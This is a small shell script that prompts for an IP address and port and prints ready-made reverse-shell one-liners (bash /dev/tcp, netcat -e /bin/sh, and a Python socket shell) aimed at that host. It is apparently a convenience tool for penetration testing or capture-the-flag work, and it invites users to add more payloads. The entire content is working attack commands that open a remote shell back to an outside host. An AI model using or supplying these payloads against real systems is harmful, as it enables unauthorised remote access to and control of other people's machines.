#!/bin/sh
#For anyone lazy LOL ^_*
echo "\n\e[1m\e[31mWhat is your ip Address?" 
read MY_IP #ip address
echo "\e[1m\e[31mWhat is your port?"
read MY_PORT #port

		
		echo "\033[37m\n<============================================>" 
		echo "\033[37m\nbash -i >& /dev/tcp/$MY_IP/$MY_PORT 0>&1\n" #revShell BASH
		echo "<============================================>\n" 
		echo "nc -e /bin/sh $MY_IP $MY_PORT\n" #revShell NC
		echo "<============================================>\n"
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$MY_IP",$MY_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\n" #revShell python
		echo "<============================================>\n"
		#You can edit and add here in the same way
		
